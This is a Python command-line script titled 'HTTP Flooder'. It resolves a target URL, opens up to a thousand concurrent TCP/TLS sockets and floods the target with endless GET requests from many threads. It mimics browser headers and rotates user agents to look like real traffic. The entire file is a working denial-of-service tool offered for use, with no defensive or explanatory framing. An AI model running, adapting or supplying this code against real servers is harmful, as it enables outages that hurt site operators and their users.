from urllib.parse import urlparse
import threading
import argparse
import socket
import random
import time
import ssl

with open("useragents.txt", "r") as file:
    useragents = file.read().splitlines()
    file.close()

class HTTPFlood(object):
    sock_list = []
    active_threads = 0

    def __init__(self, url: str, max_sockets: int, max_threads: int):
        self.url = url
        self.max_sockets = max_sockets
        self.max_threads = max_threads

        parsed_url = urlparse(url)
        self.parsed_url = parsed_url

        self.ip = socket.gethostbyname(parsed_url.hostname)
        self.port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        self.path = parsed_url.path or "/"

    def launch(self):
        threading.Thread(target=self.sender, daemon=True).start()

        while True:
            if any([len(self.sock_list) > self.max_sockets, self.active_threads >= self.max_threads]):
                time.sleep(0.05)
                continue

            threading.Thread(target=self.create_sock, daemon=True).start()
    
    def sender(self):
        while True:
            for i in range(100):
                sock_list = self.sock_list

                for sock in sock_list:
                    threading.Thread(target=self.send_http, args=[sock], daemon=True).start()

                time.sleep(0.1)

    def send_http(self, sock: socket.socket):
        http_data = f"GET / HTTP/1.1\r\n"

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "Keep-Alive",
            "Dnt": "1",
            "Host": self.parsed_url.hostname,
            "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": random.choice(useragents)
        }

        for header in headers:
            http_data += f"{header}: {headers[header]}\r\n"
        
        http_data += "\r\n"

        sent = sock.send(http_data.encode())

        if not sent:
            self.sock_list.remove(sock)

    def create_sock(self):
        self.active_threads += 1

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))

            if self.parsed_url.scheme == "https":
                ctx = ssl._create_unverified_context()
                sock = ctx.wrap_socket(sock=sock, server_hostname=self.parsed_url.hostname)

            self.send_http(sock=sock)
            time.sleep(0.1)

            self.sock_list.append(sock)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.active_threads -= 1

def main():
    parser = argparse.ArgumentParser(description="HTTP Flooder")
    parser.add_argument("URL", type=str, help="Target full URL")
    parser.add_argument("-c", "--concurrency", type=int, default=1000, help="Max socket concurrency")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Max threads for connecting")

    args = parser.parse_args()

    flooder = HTTPFlood(url=args.URL, max_sockets=args.concurrency, max_threads=args.threads)
    flooder.launch()

if __name__ == "__main__":
    main()
